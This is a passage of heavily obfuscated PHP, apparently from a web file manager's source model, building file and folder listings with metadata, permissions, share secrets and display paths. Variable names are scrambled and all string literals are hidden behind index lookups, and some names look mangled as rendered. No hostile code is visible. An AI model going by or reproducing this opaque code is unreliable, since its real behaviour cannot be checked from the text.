array_to_keyvalue($Ãäãƒ, $¦¡‹é¬×[12], $¦¡‹é¬×[399]); $ÙÜ¸Íæ™ = array_unique($ÙÜ¸Íæ™); $this->_listSourceCache($Ãäãƒ); if (!$®Ô‹ÛØ¢) { $this->_listAppendMeta($Ãäãƒ, $ÙÜ¸Íæ™); $this->_listAppendFileMeta($Ãäãƒ, $ÙÜ¸Íæ™); $this->_listAppendChildren($Ãäãƒ, $ÙÜ¸Íæ™); } $this->_listAppendPath($Ãäãƒ); $this->_listAppendAuth($Ãäãƒ); $this->_listAppendSourceInfo($Ãäãƒ, $ÙÜ¸Íæ™); $this->_listAppendUser($Ãäãƒ); $this->_listFilterInfo($Ãäãƒ, $®Ô‹ÛØ¢); $this->_listAppendAuthSecret($Ãäãƒ); } protected function _listSourceCache($±Ä¦ÆÃ) { $Ò ªÌªÍ =& $_SERVER[Ôó‡è­ƒ]; foreach ($±Ä¦ÆÃ as $òí¬‚Ø†) { self::$cacheSourceInfo[$Ò ªÌªÍ[454] . $òí¬‚Ø†[$Ò ªÌªÍ[399]]] = $òí¬‚Ø†; } } protected function _listFilterInfo(&$¬°ÔÆ¬‚, $…€ŸÉ”Ö = false) { $™“ç¹şœ =& $_SERVER[Ôó‡è­ƒ]; foreach ($¬°ÔÆ¬‚ as &$Æ°•İ˜) { $Æ°•İ˜ = $this->pathInfoFilter($Æ°•İ˜); self::$cachePathInfo[$™“ç¹şœ[455] . intval($…€ŸÉ”Ö) . $™“ç¹şœ[456] . $Æ°•İ˜[$™“ç¹şœ[399]]] = $Æ°•İ˜; } unset($Æ°•İ˜); } protected function _listMake(&$‰¦½Ì) { $º·²¢» =& $_SERVER[Ôó‡è­ƒ]; $‰¦½Ì[$º·²¢»[77]] = array(); $‰¦½Ì[$º·²¢»[76]] = array(); foreach ($‰¦½Ì[$º·²¢»[368]] as $Ìã¼ÊµÛ) { $ß•Ä¤ç« = $Ìã¼ÊµÛ[$º·²¢»[407]] == 1 ? $º·²¢»[77] : $º·²¢»[76]; $‰¦½Ì[$ß•Ä¤ç«][] = $Ìã¼ÊµÛ; } unset($‰¦½Ì[$º·²¢»[368]]); } protected function _listAppendMeta(&$¨©ÃûË, $¹ôòô«Á) { $ŒÏÏÖÓæ =& $_SERVER[Ôó‡è­ƒ]; $ÙˆÉæé = array($ŒÏÏÖÓæ[414] => array($ŒÏÏÖÓæ[415], $¹ôòô«Á)); $æË¦ıôÙ = Model($ŒÏÏÖÓæ[457])->field($ŒÏÏÖÓæ[458])->where($ÙˆÉæé)->select(); if (!$æË¦ıôÙ) { return; } $›ÀøŠ¸ = array($ŒÏÏÖÓæ[459], $ŒÏÏÖÓæ[460], $ŒÏÏÖÓæ[438]); $¼Æßüİ = array(); foreach ($æË¦ıôÙ as $™ïÒğÏ) { if (!isset($¼Æßüİ[$™ïÒğÏ[$ŒÏÏÖÓæ[399]]])) { $¼Æßüİ[$™ïÒğÏ[$ŒÏÏÖÓæ[399]]] = array(); } if (in_array($™ïÒğÏ[$ŒÏÏÖÓæ[95]], $›ÀøŠ¸)) { continue; } $¼Æßüİ[$™ïÒğÏ[$ŒÏÏÖÓæ[399]]][$™ïÒğÏ[$ŒÏÏÖÓæ[95]]] = $™ïÒğÏ[$ŒÏÏÖÓæ[373]]; } foreach ($¨©ÃûË as &$™÷‘Ñò¯) { $™÷‘Ñò¯[$ŒÏÏÖÓæ[461]] = !1; if (isset($¼Æßüİ[$™÷‘Ñò¯[$ŒÏÏÖÓæ[399]]])) { $™÷‘Ñò¯[$ŒÏÏÖÓæ[461]] = $¼Æßüİ[$™÷‘Ñò¯[$ŒÏÏÖÓæ[399]]]; } if ($this->fileIsLock($™÷‘Ñò¯) && $™÷‘Ñò¯[$ŒÏÏÖÓæ[410]]) { $¦šµÏ‡Á = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $™÷‘Ñò¯[$ŒÏÏÖÓæ[410]][$ŒÏÏÖÓæ[411]] = AuthModel::authDisable($™÷‘Ñò¯[$ŒÏÏÖÓæ[410]][$ŒÏÏÖÓæ[411]], $¦šµÏ‡Á); $™÷‘Ñò¯[$ŒÏÏÖÓæ[410]][$ŒÏÏÖÓæ[462]][$ŒÏÏÖÓæ[410]] = $™÷‘Ñò¯[$ŒÏÏÖÓæ[410]][$ŒÏÏÖÓæ[411]]; } } unset($™÷‘Ñò¯); } protected function _listAppendFileMeta(&$Ô¦êëØ¡, $•‚™ë’ª) { $¾Ä„¼Ç€ =& $_SERVER[Ôó‡è­ƒ]; $¶ä—÷œ = array_to_keyvalue($Ô¦êëØ¡, $¾Ä„¼Ç€[12], $¾Ä„¼Ç€[463]); $¶ä—÷œ = array_filter(array_unique($¶ä—÷œ)); if (!$¶ä—÷œ) { return; } $Û‚şèæû = array($¾Ä„¼Ç€[464] => array($¾Ä„¼Ç€[415], $¶ä—÷œ)); $ò™Ê®Ÿ = $¾Ä„¼Ç€[465]; $›óç‘¹æ = Model($¾Ä„¼Ç€[466])->field($ò™Ê®Ÿ)->where($Û‚şèæû)->select(); $›óç‘¹æ = array_to_keyvalue($›óç‘¹æ, $¾Ä„¼Ç€[463]); $õË÷Äğ“ = Model($¾Ä„¼Ç€[467])->field($¾Ä„¼Ç€[468])->where($Û‚şèæû)->select(); $õË÷Äğ“ = $õË÷Äğ“ ? $õË÷Äğ“ : array(); $‚…ÜÚ‡™ = array(); foreach ($õË÷Äğ“ as $»—¦•¦) { if (!isset($‚…ÜÚ‡™[$»—¦•¦[$¾Ä„¼Ç€[463]]])) { $‚…ÜÚ‡™[$»—¦•¦[$¾Ä„¼Ç€[463]]] = array(); } $‚…ÜÚ‡™[$»—¦•¦[$¾Ä„¼Ç€[463]]][$»—¦•¦[$¾Ä„¼Ç€[95]]] = $»—¦•¦[$¾Ä„¼Ç€[373]]; } foreach ($Ô¦êëØ¡ as &$ù¹á¡Äş) { $—Çéï³ = $ù¹á¡Äş[$¾Ä„¼Ç€[463]]; if (!$—Çéï³ || !is_array($›óç‘¹æ[$—Çéï³])) { continue; } $üßæ¤‚ = $›óç‘¹æ[$—Çéï³]; $üßæ¤‚[$¾Ä„¼Ç€[80]] = $ù¹á¡Äş[$¾Ä„¼Ç€[80]]; $üßæ¤‚[$¾Ä„¼Ç€[32]] = $ù¹á¡Äş[$¾Ä„¼Ç€[32]]; if (!isset(self::$cacheFileInfo[$¾Ä„¼Ç€[469] . $—Çéï³])) { self::$cacheFileInfo[$¾Ä„¼Ç€[469] . $—Çéï³] = array_merge(array(), $üßæ¤‚); } unset($›óç‘¹æ[$—Çéï³][$¾Ä„¼Ç€[78]]); $Şá³‘¤ = is_array($‚…ÜÚ‡™[$—Çéï³]) ? $‚…ÜÚ‡™[$—Çéï³] : array(); $ù¹á¡Äş[$¾Ä„¼Ç€[167]] = array_merge($Şá³‘¤, $›óç‘¹æ[$—Çéï³]); if (isset($ù¹á¡Äş[$¾Ä„¼Ç€[167]][$¾Ä„¼Ç€[166]])) { $ù¹á¡Äş[$¾Ä„¼Ç€[166]] = json_decode($ù¹á¡Äş[$¾Ä„¼Ç€[167]][$¾Ä„¼Ç€[166]], !0); unset($ù¹á¡Äş[$¾Ä„¼Ç€[167]][$¾Ä„¼Ç€[166]]); } } unset($ù¹á¡Äş); } protected function _listAppendSourceInfo(&$•ŞéÌŸÜ, $…Ÿû°©¢) { $‹Şíüâ° =& $_SERVER[Ôó‡è­ƒ]; if (!defined($‹Şíüâ°[470])) { return; } $’€”ã¹¢ = Model($‹Şíüâ°[471])->listData(); $¾²õ¥ÚÚ = Model($‹Şíüâ°[422])->listData(); $²ë˜ÍßÂ = Model($‹Şíüâ°[412])->listData(); $Ñ§•¥ñˆ = Model($‹Şíüâ°[472])->listSimple(); $›º½œÅ“ = array_to_keyvalue($’€”ã¹¢, $‹Şíüâ°[396]); $ìÈ¿²ç = array_to_keyvalue_group($¾²õ¥ÚÚ, $‹Şíüâ°[78], $‹Şíüâ°[423]); $«‡”¸˜ = array_to_keyvalue($²ë˜ÍßÂ, $‹Şíüâ°[78]); $‰šïŞ€ø = array_to_keyvalue_group($Ñ§•¥ñˆ, $‹Şíüâ°[399]); foreach ($•ŞéÌŸÜ as &$ÓÂÉı¶œ) { $ÓÂÉı¶œ[$‹Şíüâ°[87]] = array($‹Şíüâ°[473] => 0, $‹Şíüâ°[474] => 0, $‹Şíüâ°[475] => 0); if (isset($«‡”¸˜[$ÓÂÉı¶œ[$‹Şíüâ°[399]]])) { $ÓÂÉı¶œ[$‹Şíüâ°[87]][$‹Şíüâ°[476]] = 1; $ÓÂÉı¶œ[$‹Şíüâ°[87]][$‹Şíüâ°[477]] = $«‡”¸˜[$ÓÂÉı¶œ[$‹Şíüâ°[399]]][$‹Şíüâ°[32]]; } if (isset($ìÈ¿²ç[$ÓÂÉı¶œ[$‹Şíüâ°[399]]])) { $ÓÂÉı¶œ[$‹Şíüâ°[87]][$‹Şíüâ°[478]] = array(); foreach ($ìÈ¿²ç[$ÓÂÉı¶œ[$‹Şíüâ°[399]]] as $ò¸À¼Üª) { $šÚÖØÛ‹ = $›º½œÅ“[$ò¸À¼Üª]; $ÓÂÉı¶œ[$‹Şíüâ°[87]][$‹Şíüâ°[478]][] = array($‹Şíüâ°[479] => $šÚÖØÛ‹[$‹Şíüâ°[396]], $‹Şíüâ°[417] => $šÚÖØÛ‹[$‹Şíüâ°[32]], $‹Şíüâ°[480] => $šÚÖØÛ‹[$‹Şíüâ°[481]]); } } if (isset($‰šïŞ€ø[$ÓÂÉı¶œ[$‹Şíüâ°[399]]])) { $ÓÂÉı¶œ[$‹Şíüâ°[87]][$‹Şíüâ°[482]] = array(); foreach ($‰šïŞ€ø[$ÓÂÉı¶œ[$‹Şíüâ°[399]]] as $¦¼šÅÕ‘) { $ÓÂÉı¶œ[$‹Şíüâ°[87]][$‹Şíüâ°[482]] = array($‹Şíüâ°[483] => $¦¼šÅÕ‘[$‹Şíüâ°[484]], $‹Şíüâ°[485] => $¦¼šÅÕ‘[$‹Şíüâ°[486]], $‹Şíüâ°[487] => $¦¼šÅÕ‘[$‹Şíüâ°[399]], $‹Şíüâ°[488] => $¦¼šÅÕ‘[$‹Şíüâ°[489]], $‹Şíüâ°[490] => $¦¼šÅÕ‘[$‹Şíüâ°[491]], $‹Şíüâ°[492] => $¦¼šÅÕ‘[$‹Şíüâ°[492]], $‹Şíüâ°[493] => $¦¼šÅÕ‘[$‹Şíüâ°[493]]); } } } unset($ÓÂÉı¶œ); return $•ŞéÌŸÜ; } protected function _listAppendChildren(&$€¾ã¡£ß, $ûÛÜ‰ø–) { $Ğ›Ç°‹ =& $_SERVER[Ôó‡è­ƒ]; $–¾¨Ù¼Û = array(); $ø¹¤Æ• = array($Ğ›Ç°‹[206] => 0, $Ğ›Ç°‹[207] => 0); foreach ($€¾ã¡£ß as &$­õìã‘¸) { if (!$­õìã‘¸[$Ğ›Ç°‹[407]]) { continue; } $–¾¨Ù¼Û[] = $­õìã‘¸[$Ğ›Ç°‹[399]]; } unset($­õìã‘¸); if (!$–¾¨Ù¼Û) { return; } $·†õÍ®Ô = array($Ğ›Ç°‹[494] => array($Ğ›Ç°‹[7], $–¾¨Ù¼Û)); $¸“ƒ²Ëœ = array($Ğ›Ç°‹[494], $Ğ›Ç°‹[407], $Ğ›Ç°‹[495] => $Ğ›Ç°‹[496]); $öãšË¬¾ = $this->field($¸“ƒ²Ëœ)->where($·†õÍ®Ô)->group($Ğ›Ç°‹[497])->select(); $š¨¥³Ùâ = array(); foreach ($öãšË¬¾ as $³’Æ² Ë) { $âïÉš“ú = $³’Æ² Ë[$Ğ›Ç°‹[494]]; $™ó²­ë = $³’Æ² Ë[$Ğ›Ç°‹[407]] == $Ğ›Ç°‹[89] ? $Ğ›Ç°‹[207] : $Ğ›Ç°‹[206]; if (!isset($š¨¥³Ùâ[$âïÉš“ú])) { $š¨¥³Ùâ[$âïÉš“ú] = array($Ğ›Ç°‹[206] => 0, $Ğ›Ç°‹[207] => 0); } $š¨¥³Ùâ[$âïÉš“ú][$™ó²­ë] += $³’Æ² Ë[$Ğ›Ç°‹[496]]; } foreach ($€¾ã¡£ß as &$­õìã‘¸) { if (!$­õìã‘¸[$Ğ›Ç°‹[407]]) { continue; } $¸šÛ¹À¨ = is_array($š¨¥³Ùâ[$­õìã‘¸[$Ğ›Ç°‹[399]]]) ? $š¨¥³Ùâ[$­õìã‘¸[$Ğ›Ç°‹[399]]] : $ø¹¤Æ•; $­õìã‘¸[$Ğ›Ç°‹[207]] = $¸šÛ¹À¨[$Ğ›Ç°‹[207]]; $­õìã‘¸[$Ğ›Ç°‹[206]] = $¸šÛ¹À¨[$Ğ›Ç°‹[206]]; unset($­õìã‘¸[$Ğ›Ç°‹[409]]); } unset($­õìã‘¸); } protected function _listAppendAuth(&$¢‚¶•¦) { $è—…ÌÀ² =& $_SERVER[Ôó‡è­ƒ]; if (!defined($è—…ÌÀ²[470])) { return; } $‰‘‰—š˜ = array(); foreach ($¢‚¶•¦ as $¶³âÃ) { if ($¶³âÃ[$è—…ÌÀ²[408]] == self::TYPE_GROUP) { $‰‘‰—š˜[] = $¶³âÃ[$è—…ÌÀ²[399]]; } } if (!$‰‘‰—š˜) { return; } $Ô‡ İØ = array_to_keyvalue($¢‚¶•¦, $è—…ÌÀ²[399]); $˜Œ‰éõÉ = Model($è—…ÌÀ²[498])->getSourceList($‰‘‰—š˜, $Ô‡ İØ); $µúøƒôÔ = $GLOBALS[$è—…ÌÀ²[499]] == 1; foreach ($¢‚¶•¦ as $¿‰Ôå¾ş => &$¶³âÃ) { $¶³âÃ[$è—…ÌÀ²[410]] = $˜Œ‰éõÉ[$¶³âÃ[$è—…ÌÀ²[399]]]; if (!$¶³âÃ[$è—…ÌÀ²[410]] && $¶³âÃ[$è—…ÌÀ²[408]] == self::TYPE_GROUP) { $¶³âÃ[$è—…ÌÀ²[410]] = Action($è—…ÌÀ²[500])->pathGroupAuthMake($¶³âÃ[$è—…ÌÀ²[501]]); if (!$¶³âÃ[$è—…ÌÀ²[410]] && !$µúøƒôÔ) { $¶³âÃ[$è—…ÌÀ²[199]] = !1; $¶³âÃ[$è—…ÌÀ²[198]] = !1; } } if ($¶³âÃ[$è—…ÌÀ²[410]]) { $¶³âÃ[$è—…ÌÀ²[199]] = AuthModel::authCheckEdit($¶³âÃ[$è—…ÌÀ²[410]][$è—…ÌÀ²[411]]); $¶³âÃ[$è—…ÌÀ²[198]] = AuthModel::authCheckView($¶³âÃ[$è—…ÌÀ²[410]][$è—…ÌÀ²[411]]); } $this->groupPathDisplay($¶³âÃ); } unset($¶³âÃ); } public function _listAppendAuthSecret(&$©¦£„¦°) { $ü¹øÄµ¶ =& $_SERVER[Ôó‡è­ƒ]; if (Model($ü¹øÄµ¶[429])->get($ü¹øÄµ¶[502]) != $ü¹øÄµ¶[89]) { return; } static $¨ó¶¥¨Š = false; if (!$¨ó¶¥¨Š) { $Îê§æ¯¦ = Model($ü¹øÄµ¶[503]); $Ó³şÔ–¯ = Model($ü¹øÄµ¶[504]); $¨ó¶¥¨Š = $Ó³şÔ–¯->listData(); $¨ó¶¥¨Š = array_to_keyvalue($¨ó¶¥¨Š, $ü¹øÄµ¶[399]); $›‘à÷Ïâ = json_decode(Model($ü¹øÄµ¶[429])->get($ü¹øÄµ¶[505]), !0); $›‘à÷Ïâ = array_to_keyvalue($›‘à÷Ïâ, $ü¹øÄµ¶[396]); foreach ($¨ó¶¥¨Š as $üß£ã× => $ãĞ«íŒ) { $ˆ £Òå  = $›‘à÷Ïâ[$ãĞ«íŒ[$ü¹øÄµ¶[506]]]; if (!$ˆ £Òå ) { $Ó³şÔ–¯->remove($ãĞ«íŒ[$ü¹øÄµ¶[396]]); unset($¨ó¶¥¨Š[$üß£ã×]); continue; } $±òÉ”óÀ = $Îê§æ¯¦->listData($ˆ £Òå [$ü¹øÄµ¶[410]]); if (!$±òÉ”óÀ) { $Ó³şÔ–¯->remove($ãĞ«íŒ[$ü¹øÄµ¶[396]]); unset($¨ó¶¥¨Š[$üß£ã×]); continue; } $ãĞ«íŒ[$ü¹øÄµ¶[410]] = $±òÉ”óÀ; $ãĞ«íŒ[$ü¹øÄµ¶[507]] = $ˆ £Òå ; $ãĞ«íŒ[$ü¹øÄµ¶[508]] = Model($ü¹øÄµ¶[509])->getInfoSimpleOuter($ãĞ«íŒ[$ü¹øÄµ¶[448]]); $¨ó¶¥¨Š[$üß£ã×] = $ãĞ«íŒ; } } $–ªí²” = defined($ü¹øÄµ¶[510]) ? USER_ID : $ü¹øÄµ¶[12]; $íœùÊ€ = array(); $Ş¨¾§ã… = $this->_listAppendPath($íœùÊ€, !0); foreach ($©¦£„¦° as $üß£ã× => &$ãĞ«íŒ) { if (!is_array($ãĞ«íŒ[$ü¹øÄµ¶[410]])) { continue; } if ($ãĞ«íŒ[$ü¹øÄµ¶[408]] != $ü¹øÄµ¶[511]) { continue; } if (isset($¨ó¶¥¨Š[$ãĞ«íŒ[$ü¹øÄµ¶[399]]])) { $¥óÇ±®™ = $¨ó¶¥¨Š[$ãĞ«íŒ[$ü¹øÄµ¶[399]]]; if (!is_array($ãĞ«íŒ[$ü¹øÄµ¶[461]])) { $ãĞ«íŒ[$ü¹øÄµ¶[461]] = array(); } $ãĞ«íŒ[$ü¹øÄµ¶[461]][$ü¹øÄµ¶[512]] = $¥óÇ±®™[$ü¹øÄµ¶[506]]; $ãĞ«íŒ[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[513]] = $¥óÇ±®™; $ãĞ«íŒ[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[514]] = $ãĞ«íŒ[$ü¹øÄµ¶[515]]; $ãĞ«íŒ[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[516]] = $ü¹øÄµ¶[89]; if ($¥óÇ±®™[$ü¹øÄµ¶[448]] != $–ªí²”) { $ãĞ«íŒ[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[411]] = $ãĞ«íŒ[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[411]] & $¥óÇ±®™[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[410]]; } continue; } $¦´¯ÇŞ = $this->parentLevelArray($ãĞ«íŒ[$ü¹øÄµ¶[517]]); $ı™°í€‰ = array_reverse($¦´¯ÇŞ); foreach ($ı™°í€‰ as $’Ãİ©â™ => $š¦üıÒï) { if (!isset($¨ó¶¥¨Š[$š¦üıÒï])) { continue; } $¥óÇ±®™ = $¨ó¶¥¨Š[$š¦üıÒï]; $ãĞ«íŒ[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[513]] = $¥óÇ±®™; if ($¥óÇ±®™[$ü¹øÄµ¶[448]] != $–ªí²”) { $ãĞ«íŒ[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[411]] = $ãĞ«íŒ[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[411]] & $¥óÇ±®™[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[410]]; } $‡Ôå º = $ü¹øÄµ¶[12]; $„¿”´ • = count($¦´¯ÇŞ) - $’Ãİ©â™; for ($ÍçÉ”ü£ = 0; $ÍçÉ”ü£ < $„¿”´ •; $ÍçÉ”ü£++) { if (!isset($Ş¨¾§ã…[$¦´¯ÇŞ[$ÍçÉ”ü£]])) { $‡Ôå º = $ü¹øÄµ¶[12]; break; } $‡Ôå º = $‡Ôå º . rtrim($Ş¨¾§ã…[$¦´¯ÇŞ[$ÍçÉ”ü£]], $ü¹øÄµ¶[8]) . $ü¹øÄµ¶[8]; } $ãĞ«íŒ[$ü¹øÄµ¶[410]][$ü¹øÄµ¶[514]] = rtrim($‡Ôå º, $ü¹øÄµ¶[8]) . $ü¹øÄµ¶[8]; break; } } unset($ãĞ«íŒ); } public function groupPathDisplay(&$ÚÙÒ«…Í) { $õü—üŠå =& $_SERVER[Ôó‡è­ƒ]; if ($ÚÙÒ«…Í[$õü—üŠå[408]] != self::TYPE_GROUP) { return; } $Èô—…¥Å = Model($õü—üŠå[518])->getInfo($ÚÙÒ«…Í[$õü—üŠå[501]]); $„³ÈÀú” = $this->parentLevelArray($Èô—…¥Å[$õü—üŠå[517]]); $Ú×ê¤­± = $õü—üŠå[12]; foreach ($„³ÈÀú” as $Ğ²Õ˜ªš) { $íÅÔ·ˆ÷ = Model($õü—üŠå[518])->getInfo($Ğ²Õ˜ªš); $Ú×ê¤­± .= $íÅÔ·ˆ÷[$õü—üŠå[87]][$õü—üŠå[399]] . $õü—üŠå[50]; } $ÚÙÒ«…Í[$õü—üŠå[519]] = $Èô—…¥Å[$õü—üŠå[494]]; $ÚÙÒ«…Í[$õü—üŠå[520]] = $Èô—…¥Å[$õü—üŠå[517]]; $ÚÙÒ«…Í[$õü—üŠå[521]] = $Èô—…¥Å[$õü—üŠå[522]]; $ÚÙÒ«…Í[$õü—üŠå[523]] = $Ú×ê¤­± . $Èô—…¥Å[$õü—üŠå[87]][$õü—üŠå[399]]; } protected function _listAppendPath(&$§Â­§¬ç, $ŠÑ÷Í­ = false) { $ëäã®ùâ =& $_SERVER[Ôó‡è­ƒ]; static $Ã¢Ë¡ù° = array(); $¼÷õ™ºı = array(); $«ÂÎµŞ = array(); if ($ŠÑ÷Í­) { return $Ã¢Ë¡ù°; } foreach ($§Â­§¬ç as &$ÎÅÇøä÷) { $¿èÕ‘ôÙ = $ÎÅÇøä÷[$ëäã®ùâ[399]]; if ($ÎÅÇøä÷[$ëäã®ùâ[407]] == $ëäã®ùâ[89] && $ÎÅÇøä÷[$ëäã®ùâ[494]] != 0) { $Ã¢Ë¡ù°[$¿èÕ‘ôÙ] = $ÎÅÇøä÷[$ëäã®ùâ[32]]; } if ($ÎÅÇøä÷[$ëäã®ùâ[407]] == $ëäã®ùâ[89] && $ÎÅÇøä÷[$ëäã®ùâ[494]] == 0 && !isset($Ã¢Ë¡ù°[$¿èÕ‘ôÙ])) { $Ã¢Ë¡ù°[$¿èÕ‘ôÙ] = $this->_listAppendPathRoot($ÎÅÇøä÷, array()); } if (isset($«ÂÎµŞ[$ÎÅÇøä÷[$ëäã®ùâ[517]]])) { continue; } $«ÂÎµŞ[$ÎÅÇøä÷[$ëäã®ùâ[517]]] = !0; $ßÒ‡»Ó˜ = $this->parentLevelArray($ÎÅÇøä÷[$ëäã®ùâ[517]]); foreach ($ßÒ‡»Ó˜ as $İ—¤ÉÀÅ => $¦„ç¨Œ) { if (isset($Ã¢Ë¡ù°[$¦„ç¨Œ])) { continue; } if ($İ—¤ÉÀÅ == 0) { $Ã¢Ë¡ù°[$¦„ç¨Œ] = $this->_listAppendPathRoot($ÎÅÇøä÷, $ßÒ‡»Ó˜); } if ($İ—¤ÉÀÅ != 0) { $¼÷õ™ºı[] = $¦„ç¨Œ; } } } unset($ÎÅÇøä÷); $¼÷õ™ºı = array_unique($¼÷õ™ºı); if (count($¼÷õ™ºı) > 0) { $Ïš´ëÏ = array($ëäã®ùâ[414] => array($ëäã®ùâ[415], $¼÷õ™ºı)); if (count($¼÷õ™ºı) == 1) { $µ¦ŒÅ«æ = $this->sourceInfo($¼÷õ™ºı[0]); $ÈíĞí¤Û = is_array($µ¦ŒÅ«æ) ? array($µ¦ŒÅ«æ) : !1; } else { $ÈíĞí¤Û = $this->field($ëäã®ùâ[524])->where($Ïš´ëÏ)->select(); } if (!$ÈíĞí¤Û) { $ÈíĞí¤Û = array(); } foreach ($ÈíĞí¤Û as $¥çñËÄ ) { $Ã¢Ë¡ù°[$¥çñËÄ [$ëäã®ùâ[399]]] = $¥çñËÄ [$ëäã®ùâ[32]]; } } $óÓÛÚ¹› = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¼îÏİÜû = array(); foreach ($§Â­§¬ç as &$ÎÅÇøä÷) { $Æ¬½¤ßË = $ÎÅÇøä÷[$ëäã®ùâ[517]]; $°şÀ¶€ğ = $ëäã®ùâ[12]; if (isset($¼îÏİÜû[$Æ¬½¤ßË])) { $°şÀ¶€ğ = $¼îÏİÜû[$Æ¬½¤ßË]; } else { $ßÒ‡»Ó˜ = $this->parentLevelArray($ÎÅÇøä÷[$ëäã®ùâ[517]]); foreach ($ßÒ‡»Ó˜ as $İ—¤ÉÀÅ => $¦„ç¨Œ) { if (isset($Ã¢Ë¡ù°[$¦„ç¨Œ])) { $°şÀ¶€ğ .= $Ã¢Ë¡ù°[$¦„ç¨Œ] . $ëäã®ùâ[8]; } } $¼îÏİÜû[$Æ¬½¤ßË] = $°şÀ¶€ğ; } $°şÀ¶€ğ .= $ÎÅÇøä÷[$ëäã®ùâ[32]]; if ($ÎÅÇøä÷[$ëäã®ùâ[407]] == $ëäã®ùâ[89]) { $°şÀ¶€ğ .= $ëäã®ùâ[8]; } $ÎÅÇøä÷[$ëäã®ùâ[515]] = str_replace($ëäã®ùâ[525], $ëäã®ùâ[8], $°şÀ¶€ğ); if ($ÎÅÇøä÷[$ëäã®ùâ[494]] == $ëäã®ùâ[194]) { $ÎÅÇøä÷[$ëäã®ùâ[32]] = trim($Ã¢Ë¡ù°[$ÎÅÇøä÷[$ëäã®ùâ[399]]], $ëäã®ùâ[8]); $ÎÅÇøä÷[$ëäã®ùâ[515]] = $ÎÅÇøä÷[$ëäã®ùâ[32]] . $ëäã®ùâ[8]; } if (intval($ÎÅÇøä÷[$ëäã®ùâ[408]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÎÅÇøä÷, $ßÒ‡»Ó˜, $óÓÛÚ¹›); } } unset($ÎÅÇøä÷); return $§Â­§¬ç; } private function _listAppendPathRecycle(&$ôÉ’°·Š, $ìÑ×ÂÙß, $é©íÙå¤) { $İÄŒÇ¯è =& $_SERVER[Ôó‡è­ƒ]; if (!in_array($é©íÙå¤, $ìÑ×ÂÙß) && $ôÉ’°·Š[$İÄŒÇ¯è[399]] != $é©íÙå¤) { return; } $“§„Æ = explode($İÄŒÇ¯è[8], trim($ôÉ’°·Š[$İÄŒÇ¯è[515]], $İÄŒÇ¯è[8])); $ú–‡öé = implode($İÄŒÇ¯è[8], array_slice($“§„Æ, 2)); $ôÉ’°·Š[$İÄŒÇ¯è[515]] = $İÄŒÇ¯è[8] . LNG($İÄŒÇ¯è[526]) . $İÄŒÇ¯è[8] . ltrim($ú–‡öé, $İÄŒÇ¯è[8]); $ôÉ’°·Š[$İÄŒÇ¯è[517]] = $İÄŒÇ¯è[527] . implode($İÄŒÇ¯è[50], array_slice($ìÑ×ÂÙß, 1)) . $İÄŒÇ¯è[50]; if ($ôÉ’°·Š[$İÄŒÇ¯è[399]] == $é©íÙå¤) { $ôÉ’°·Š[$İÄŒÇ¯è[517]] = $İÄŒÇ¯è[527]; $ôÉ’°·Š[$İÄŒÇ¯è[494]] = $İÄŒÇ¯è[194]; $ôÉ’°·Š[$İÄŒÇ¯è[32]] = LNG($İÄŒÇ¯è[526]); } $ôÉ’°·Š[$İÄŒÇ¯è[528]] = $İÄŒÇ¯è[529]; } protected function _listAppendPathRoot(&$¤À„õ…Ù, $´ĞÊøè…) { $—Ÿ§¯ =& $_SERVER[Ôó‡è­ƒ]; $í§‹Ó”µ = $—Ÿ§¯[12]; if ($¤À„õ…Ù[$—Ÿ§¯[408]] == self::TYPE_USER) { if (defined($—Ÿ§¯[470]) && $¤À„õ…Ù[$—Ÿ§¯[501]] == USER_ID) { $í§‹Ó”µ = LNG($—Ÿ§¯[530]); if (!$´ĞÊøè…) { $¤À„õ…Ù[$—Ÿ§¯[32]] = $í§‹Ó”µ; } } else { $ÕÆ­ÖÊİ = Model($—Ÿ§¯[509])->getInfoSimple($¤À„õ…Ù[$—Ÿ§¯[501]]); $í§‹Ó”µ = LNG($—Ÿ§¯[531]) . $—Ÿ§¯[163] . $ÕÆ­ÖÊİ[$—Ÿ§¯[32]] . $—Ÿ§¯[532]; $¤À„õ…Ù[$—Ÿ§¯[533]] = array($—Ÿ§¯[32] => $ÕÆ­ÖÊİ[$—Ÿ§¯[32]], $—Ÿ§¯[534] => $ÕÆ­ÖÊİ[$—Ÿ§¯[534]], $—Ÿ§¯[535] => $ÕÆ­ÖÊİ[$—Ÿ§¯[535]]); } } else { if ($¤À„õ…Ù[$—Ÿ§¯[408]] == self::TYPE_GROUP) { $ÕÆ­ÖÊİ = Model($—Ÿ§¯[518])->getInfoSimple($¤À„õ…Ù[$—Ÿ§¯[501]]); $í§‹Ó”µ = $ÕÆ­ÖÊİ[$—Ÿ§¯[32]]; } else { if ($¤À„õ…Ù[$—Ÿ§¯[408]] == self::TYPE_SYSTEM) { $í§‹Ó”µ = $—Ÿ§¯[536]; } } } $í§‹Ó”µ = $í§‹Ó”µ ? $—Ÿ§¯[8] . $í§‹Ó”µ . $—Ÿ§¯[8] : $—Ÿ§¯[8]; return $í§‹Ó”µ; } protected function _listAppendUser(&$ºµÃ‰Š±) { $¨·Íİ¢ =& $_SERVER[Ôó‡è­ƒ]; $Šü¬æªæ = array_to_keyvalue($ºµÃ‰Š±, $¨·Íİ¢[12], $¨·Íİ¢[448]); $î¬Ñ¦öÜ = array_to_keyvalue($ºµÃ‰Š±, $¨·Íİ¢[12], $¨·Íİ¢[450]); $Éå“¨Ú“ = array_merge($Šü¬æªæ, $î¬Ñ¦öÜ); $÷¾¸á‘ã = Model($¨·Íİ¢[537])->userListInfo($Éå“¨Ú“); foreach ($ºµÃ‰Š± as &$±Õì”¯‹) { $©ˆ€Ïâ¦ = $±Õì”¯‹[$¨·Íİ¢[448]]; $±Õì”¯‹[$¨·Íİ¢[448]] = $÷¾¸á‘ã[$©ˆ€Ïâ¦] ? $÷¾¸á‘ã[$©ˆ€Ïâ¦] : !1; $©ˆ€Ïâ¦ = $±Õì”¯‹[$¨·Íİ¢[450]]; 